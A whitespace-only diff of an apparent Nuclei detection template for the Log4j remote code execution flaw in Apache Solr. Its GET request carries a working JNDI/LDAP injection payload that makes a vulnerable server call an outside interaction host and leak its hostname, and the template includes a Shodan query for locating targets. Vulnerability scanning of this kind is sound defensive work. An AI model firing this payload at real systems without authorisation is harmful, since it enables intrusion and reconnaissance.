@@ -1,4 +1,5 @@
 id: apache-solr-log4j-rce
+
 info:
   name: Apache Solr 7+ - Log4j Remote Code Execution
   author: Evan Rubinstein,nvn1729
@@ -19,25 +20,29 @@ info:
     verified: true
     shodan-query: http.html:"Apache Solr"
   tags: cve,cve2021,solr,oast,log4j,rce,apache,jndi
+
 requests:
   - method: GET
     path:
       - "{{BaseURL}}/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.{{interactsh-url}}/a%7D"
+
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+        part: interactsh_protocol  # Confirms the DNS Interaction
         words:
           - "dns"
+
       - type: regex
         part: interactsh_request
         regex:
           - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
     extractors:
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${hostName} in output
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
 
 # Enhanced by mp on 2022/05/27
